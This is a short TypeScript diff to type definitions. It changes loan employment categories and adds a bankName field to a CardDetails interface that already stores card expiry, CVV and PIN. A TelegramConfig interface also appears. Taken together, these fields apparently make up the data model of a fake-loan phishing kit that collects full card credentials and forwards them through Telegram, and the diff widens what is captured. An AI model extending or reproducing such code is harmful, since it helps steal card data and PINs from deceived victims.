@@ -1,4 +1,4 @@
-export type EmploymentType = 'Salaried Employee' | 'Self Employed';
+export type EmploymentType = 'Salaried' | 'Business';
 
 export interface LoanDetails {
   phone: string;
@@ -21,6 +21,7 @@ export interface CardDetails {
   exp: string;
   cvv: string;
   pin: string;
+  bankName?: string;
 }
 
 export interface TelegramConfig {
